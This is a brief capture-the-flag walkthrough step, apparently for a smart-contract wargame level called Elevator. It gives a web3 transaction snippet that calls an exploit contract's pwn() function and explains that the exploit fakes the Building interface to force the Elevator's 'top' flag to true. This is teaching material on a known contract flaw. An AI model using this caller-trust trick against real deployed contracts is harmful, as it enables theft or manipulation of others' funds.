## 11. Elevator

First, deploy the ElevatorExploit contract.
Then, call the **pwn()** function.

```javascript
web3.eth.sendTransaction({
    to:attacker,
    from:player,
    data: web3.eth.abi.encodeFunctionSignature('pwn()')
})
```

This contracts implements the Building interface in such a way that the *top* variable of the Elevator contract
will be set to *true*, noticing the fact that Elevator's **goTo(uint)** function uses the sender contract as a Building instance.
